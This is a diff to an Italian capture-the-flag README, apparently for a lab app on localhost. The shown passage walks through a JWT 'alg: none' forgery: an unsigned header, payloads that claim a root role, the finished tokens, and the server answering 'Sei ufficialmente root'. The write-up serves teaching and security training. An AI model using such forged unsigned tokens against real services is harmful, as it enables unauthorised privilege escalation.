@@ -109,8 +109,7 @@ Il software implementato provvede ad esporre su *localhost*, sulla porta 3000, q
   Come si evince, senza alcuna modifica non siamo in grado di *catturare la bandiera*
  
 **4) Andiamo ad analizzare il JWT appena ricevuto**
- ```
- ```
+
  La prima parte del JWT è quella che riguarda l'Header, dove viene specificato l'algoritmo di codifica
  ```
  eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9
@@ -175,3 +174,32 @@ Proviamo quindi a cambiare la stringa relativa all'Header con un nuovo JSON
  ```
  ewogICJ0eXAiOiAiSldUIiwKICAiYWxnIjogIm5vbmUiCn0.ewogICJ1c2VybmFtZSI6ICJzdHVkZW50ZV9zZW1wbGljZSIsCiAicnVvbG8iOiJyb290Igp9.
  ```
+ Se proviamo a chiamare l'endpoint */scopriruolo* con questo JWT il server risponderà in questo modo
+ ```
+ {
+    "message": "Mi dispiace per te ma sei un fake root"
+  }
+ ```
+ Questo perché nel codice è stato inserito un controllo per evitare che il ruolo possa essere scritto *in chiaro*. Cambiando ancora una volta il Payload ed usando il ruolo *codificato* *abcde* possiamo finalmente *catturare la bandiera*
+ Proviamo però a cambiare la stringa relativa al Payload con un nuovo JSON
+ ```
+ {
+  "username": "studente_semplice",
+ "ruolo":"abcde"
+}
+ ```
+ Che codificato risulta essere
+ ```
+ ewogICJ1c2VybmFtZSI6ICJzdHVkZW50ZV9zZW1wbGljZSIsCiAicnVvbG8iOiJhYmNkZSIKfQ
+ ```
+ Il nuovo JWT sarà quindi
+ ```
+ ewogICJ0eXAiOiAiSldUIiwKICAiYWxnIjogIm5vbmUiCn0.ewogICJ1c2VybmFtZSI6ICJzdHVkZW50ZV9zZW1wbGljZSIsCiAicnVvbG8iOiJhYmNkZSIKfQ.
+ ```
+  Se proviamo a chiamare l'endpoint */scopriruolo* con questo JWT il server risponderà in questo modo
+ ```
+ {
+    "message": "Sei ufficialmente root"
+ }
+ ```
+## Conclusioni
